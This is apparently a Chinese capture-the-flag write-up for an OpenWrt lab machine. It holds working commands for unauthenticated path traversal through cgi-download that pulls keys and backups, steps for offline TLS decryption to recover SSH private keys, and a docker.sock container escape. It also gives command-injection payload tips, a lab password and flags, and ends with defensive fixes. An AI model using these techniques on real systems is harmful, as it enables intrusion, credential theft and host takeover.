# OpenWrt netflow-analyzer 靶机 Writeup

> 目标：172.16.12.149（8080 = LuCI 管理后台）
> 结果：
> - **user.txt**：`flag{user-2ee065d02ec46d44cffafdef435ef1f3}`
> - **root.txt**：`flag{root-947708f370a19f588d5c02c173a589f9}`

---

## 0. 先把拓扑理清（这是本题最容易迷路的地方）

你之前卡住，很大原因是**两台容器长得一模一样**，都叫 OpenWrt 18.06.4，都弹同一个 banner。

```
172.16.12.149（真正的宿主机 / Docker 宿主）
├── 22/tcp    → 宿主机自己的 sshd（OpenSSH 10.3，只许公钥，有频率限制）
├── 80/tcp    → nginx + PHP 8.5.8，"Hello, MazeSec!"，纯幌子，没有入口
├── 8080/8443 → 容器 openwrt-wrt   （容器 IP 192.168.90.21）← 你打的是这台
└── 2222      → 容器 openwrt-host  （容器 IP 192.168.90.22）← flag 在这台
```

**怎么确认的**：比对 SSH host key 指纹，这个不会骗人。

| 从外面看                 | 指纹                                                   | 从容器里看                  | 结论             |
| -------------------- | ---------------------------------------------------- | ---------------------- | -------------- |
| `172.16.12.149:22`   | `SHA256:i2UIg7g9fQQwI5bCeo4D8HncjAedsXLeeoATKY9S5bc` | `192.168.90.1:22` 同指纹  | 这是网关＝Docker 宿主 |
| `172.16.12.149:2222` | `SHA256:aWtcYvllmpzupyJYavXGK1aNSXr1Nq6MK+rwVuv6uDo` | `192.168.90.22:22` 同指纹 | 2222 才是第二台容器   |

再在容器里扫一遍 `192.168.90.0/24`：只有 `.1`（宿主）、`.21`（我们）、`.22`（另一台容器）。

---

## 1. 为什么第一步 RCE 拿不到 flag

8080 那台（openwrt-wrt）在本题里的定位是**入口/跳板**，不是终点。

它的 `/` 被翻遍只有：源码 `/opt/wrt`、流量包 `/var/captures`、备份包 `/var/backups`、空目录 `/var/keys`。
`/root` 里只有一个 `.ssh`，没有 user.txt。

它的价值是两个：
1. 给你一个 **root shell**（虽然是容器内的 root）；
2. 给你一个**内网视野**（能扫到 `.1` 和 `.22`）。

> 顺便回答你笔记里的疑问：
> - `/export`、`/files` 返回 **403 且长度和别的 403 不一样**（122B vs 181B）→ 说明这两个目录真实存在，只是 `no_dirlists 1` 不让列目录；
> - `export/index.txt`、`files/readme.txt` 是目录扫描器字典里最靠前的两个"默认文件名"，猜中它们是**概率**，不是推理。所以"想不通"很正常，这一步本来就是运气+字典。

---

## 2. 完整攻击链

```
[1] 匿名路径穿越  → 读 /var/log/messages，拿到 pcap 文件名
[2] 拿备份包      → etc/uhttpd.key（TLS 服务器私钥）+ backup-notes.txt（路标）
[3] 离线解密 pcap → 从 HTTPS 会话里捞出管理员上传的 SSH 私钥
[4] 私钥登 2222   → openwrt-host 容器 root → /root/user.txt
[5] docker.sock   → 挂宿主 / → /root/root.txt
```

### 2.1 漏洞 A：cgi-io 路径穿越（不需要登录）

```
GET /cgi-bin/cgi-download?path=/www/export/../../var/log/messages
```

原理（server.py 里注释都写了）：rpcd ACL 用 `/www/export/*` 做 **fnmatch 字符串匹配**，而且**没传 FNM_PATHNAME**，所以 `*` 能跨 `/`；校验通过后，`stat()/open()` 用的还是**同一个没规范化**的路径 —— 字符串层面的边界和文件系统的语义边界不一致，就穿过去了。

`/var/log/messages` 里那几行 `flush ... -> /var/captures/mgmt-20190524-0912.pcap` 就是文件名来源（这就是为什么题目要"已知目录、不知文件名"还留了日志）。

同样这个方法能直接下 pcap 和备份包，全程不用登录：
```bash
curl -o server.key 'http://<t>/cgi-bin/cgi-download?path=/www/export/../../../opt/wrt/tls/server.key'
curl -o backup.tar.gz 'http://<t>/cgi-bin/cgi-download?path=/www/export/../../../var/backups/backup-20190524.tar.gz'
curl -o 0912.pcap     'http://<t>/cgi-bin/cgi-download?path=/www/export/../../../var/captures/mgmt-20190524-0912.pcap'
```
（登录后也可以走 `/cgi-bin/luci/backup/download?file=backup-20190524.tar.gz`，口令就是 `root/netflow2019`——这个口令在 pcap 的**明文 HTTP** 会话里就是裸的。）

### 2.2 备份包里藏着两个关键东西

```
etc/uhttpd.key      ← LuCI HTTPS 的服务器私钥
etc/uhttpd.crt
backup-notes.txt    ← 路标
```

`backup-notes.txt` 原话：

> 2019-05-24 09:31 - pushed the Docker host's root key to this box over HTTPS
> (admin -> SSH-Keys) so the host can be managed from the UI.
> That session is inside the 09:31 capture.

翻译一下：**管理员通过「SSH-Keys」管理页，把宿主机 root 的私钥推到这台设备上了，那次 HTTPS 会话就在 09:31 的流量包里。**

这一句话就把后面两步全指明了：解流量包 → 里面有私钥。

### 2.3 本题真正的考点：离线解密 TLS 流量

服务端的 TLS 是**刻意复刻 2019 年设备**的：

- 只开 `TLS1.2`
- 只保留 `TLS_RSA_WITH_AES_128_CBC_SHA`（`0x002f`），**排除所有 ECDHE/DHE**
- 关闭 `extended_master_secret` 和 `encrypt_then_mac`

这三条合起来意味着：

| 配置                         | 后果                                                           |
| -------------------------- | ------------------------------------------------------------ |
| 静态 RSA 密钥交换（无 PFS）         | 只要拿到服务器私钥，就能解密**历史**流量                                       |
| 关掉 EMS                     | master secret 的 PRF 只吃 `client_random + server_random`，可逐条计算 |
| 关掉 EtM（走 MAC-then-encrypt） | 密文解出来，砍掉尾部 20 字节 HMAC-SHA1 + padding 就是明文                    |
|                            |                                                              |
|                            |                                                              |

**手工解密六步**（脚本 `tlsdec.py`，python + openssl 就够，不需要 scapy/wireshark）：

1. 按 TCP 流重组：按 seq 排序，注意**重传/部分重叠要处理**（重叠部分要只补缺口，不能整段丢弃，否则后面的字节全错位）。
2. 从 `ServerHello`/`ClientHello` 取 32 字节 random。
   ⚠️ **踩过的坑**：handshake body 的布局是 `version(2) + random(32) + ...`，所以 random 是 `body[2:34]`。我第一版写成 `body[6:38]`（把 4 字节握手头算重了），结果 RSA 解出来了、长度也正好 48、一切"看起来成功"，但解出来的明文全是乱码 —— 因为 random 错 → master secret 错 → 密钥全错。**这类"静默错误"只能靠"明文里应该有 HTTP 头"来判断。**
3. `ClientKeyExchange` 里 256 字节 RSA 密文，用 `server.key` 做 PKCS#1 v1.5 解 → 48 字节 premaster secret。
4. `master_secret = PRF_SHA256(premaster, "master secret", client_random‖server_random)[:48]`
5. `key_block = PRF_SHA256(master, "key expansion", server_random‖client_random)`
   → 拆成 `client_MAC(20) + server_MAC(20) + client_key(16) + server_key(16)`
6. 每条记录：`explicit_IV(16) + AES-128-CBC密文`，解完去掉 padding 和 20 字节 MAC。

> 顺带一个发现：pcap 里有到 `192.168.99.53:443` 的会话解不开（RSA 解出来长度不对）——因为那台是另一台服务器、用另一把私钥，属于**故意放的干扰流量**（4~6MB 的随机数据下载，专门用来把分析带偏）。

### 2.4 从解密后的明文里捞私钥

解密成功后，明文里能直接看到管理员的操作序列：

```
POST /cgi-bin/luci/                   luci_username=root&luci_password=netflow2019     → 302 + Set-Cookie
GET  /admin/ssh_keys                                                                   → 200
POST /cgi-bin/luci/admin/ssh_keys     keys=-----BEGIN OPENSSH PRIVATE KEY-----%0Ab3BlbnNzaC1rZXkt...
POST /cgi-bin/luci/admin/ssh_keys     keys=ssh-rsa AAAAB3...root@openwrt-wrt            → 400 no private key in body
POST /cgi-bin/luci/admin/ssh_keys     keys=-----BEGIN OPENSSH PRIVATE KEY-----%0Ab3BlbnNzaC1rZXkt...
```

一共两次成功上传（返回 `{"result":"stored","keys":1}`）。把 URI 解码（`+`→空格，`%0A`→换行）就得到两把 2048 位 RSA 私钥。

我还顺手验了一下私钥完整性（怕重组出错导致"看起来是 key 但参数被改坏"）：解析 `openssh-key-v1` 结构，检查 `checkint1==checkint2`、公私钥 modulus 一致、`p*q==n`、`d*e ≡ 1 mod λ(n)`、RSA 签验回环 —— 都通过，说明捞出来的 key 是干净的。

### 2.5 用私钥登 2222 → user.txt

```bash
ssh -p 2222 -i id_key_34550 root@172.16.12.149
# uid=0(root)  hostname=OpenWrt
cat /root/user.txt
# flag{user-2ee065d02ec46d44cffafdef435ef1f3}
```

`.22` 的 `authorized_keys` 注释正是 `root@openwrt-host`，对得上。

⚠️ **重要区别**：这把 key 在宿主机自己的 **22** 端口上是**无效**的（我试了 root/user/maze/ctf 等都被拒，而且触发频率限制开始 `Connection closed`）。
所以别再往 22 上怼了 —— 22 是宿主自己的 sshd（口令由 `.env` 的 `ROOT_PASSWORD` 注入、强口令），2222 才是那台 openwrt-host 容器。

### 2.6 容器逃逸拿 root.txt

登进 `openwrt-host` 后，`/entrypoint.sh` 自己就把答案写出来了：

```bash
# root flag 不在容器里（也不挂载），只在宿主机 /root/root.txt
```

而 `ls -la /run/` 里赫然躺着：

```
srw-rw---- 1 root 103 0 Nov  3 12:25 docker.sock
```

**把 docker.sock 挂进容器 = 把宿主 root 直接送人。** 用它起一个容器把宿主根目录挂进来即可：

```bash
docker run -d --name esc --entrypoint cat \
  -v /:/host openwrt-lab-openwrt-host /host/root/root.txt
docker logs esc
# flag{root-947708f370a19f588d5c02c173a589f9}
```

⚠️ 两个小坑：
- 镜像自带 `ENTRYPOINT /entrypoint.sh`，不加 `--entrypoint` 你的命令会被吞掉（我第一次就看到容器在刷 sshd 启动 banner）；
- 别用 `docker run` 前台（`-d` + `docker logs` 更稳），也别在 SSH 里嵌套双引号（Windows/PowerShell 会把引号吃掉，导致 `sh -c` 的后续命令跑到远端 shell 上执行）。

最后确认一下宿主 `/root`：
```
-rw------- 1 root root 44 Oct 25 05:34 root.txt
```

---

## 3. 一句话串起来

> 8080 的命令注入给 shell（但容器里没 flag）→ 匿名路径穿越读日志/下备份 → 备份给 TLS 私钥 + 一张"路标便签" → 用私钥离线解 HTTPS 流量 → 从会话里捞出管理员上传的 SSH 私钥 → 2222 登 openwrt-host 拿 **user.txt** → 该容器挂着 docker.sock → 挂宿主根目录拿 **root.txt**

---

## 4. 几个实操小经验（下次省时间）

1. **`&` 会截断注入点**：`IFACE="${IFACE%%&*}"`，所以 payload 里不能出现 `&`。`2>&1`、`&&`、`A=1 & cmd` 全废，要用 `2>/dev/null`、`;`。
2. **CGI 有 20 秒硬超时**（`subprocess.run(timeout=20)`），端口扫描/`find /` 这种容易 500，要缩小范围或分步。
3. **会话只有 1 小时**（`SESSION_TTL=3600`），cookie 过期直接 403，重新 POST `/cgi-bin/luci` 就行。
4. **长命令用 base64 传**：`echo <b64> | base64 -d > /tmp/x.sh; sh /tmp/x.sh`，绕开引号和转义地狱。
5. **判断"解出来是垃圾还是真的"**：明文里应该出现 `HTTP/1.1 `、`GET /`、`BEGIN OPENSSH PRIVATE KEY` 这类特征串，没有就是密钥/偏移算错了。

---

## 5. 防守建议（这题每个环节都能修）

| 环节 | 修法 |
|---|---|
| cgi-io 路径穿越 | ACL 校验前先 `realpath()` 规范化，且 `fnmatch` 加 `FNM_PATHNAME`（这正是 CVE-2026-62947 的官方修法） |
| CVE-2019-12272 | `iface` 走白名单（只允许 `eth0/br-lan/...`），永不拼进 shell |
| 备份包 | 别把 TLS 私钥、SSH 私钥打进可下载的备份 |
| TLS 配置 | 开 ECDHE（前向保密）+ EMS + Encrypt-then-MAC；`TLS_RSA_WITH_AES_128_CBC_SHA` 这种该禁 |
| 日志 | 别把内部归档的真实文件名写进 syslog |
| 管理页面 | **永远不要通过 Web 页面上传私钥**；公钥也要审计 |
| 容器 | 绝不挂 `/var/run/docker.sock`；要挂就挂只读的、最小权限的（如 docker-socket-proxy） |
| 弱口令 | `root/netflow2019` 直接写在 readme 的 build 年里，等于公开 |

---

## 6. 附：本次用的脚本

| 文件 | 作用 |
|---|---|
| `tlsdec.py` | TLS 1.2 / RSA 静态密钥 离线解密（pcap → 明文），依赖 openssl CLI |
| `verify_key.py` | 校验还原出来的 OpenSSH 私钥结构/数学一致性 |
| `extract_keys.py` | 从解密后的 POST body 里还原私钥文件 |
| `pcapinfo.py` / `pcappay.py` / `dns.py` | pcap 流量归并、明文协议提取、DNS 查询提取 |
| `rce.ps1` | 打 CVE-2019-12272 的通用命令执行小工具（自动处理 cookie 过期） |
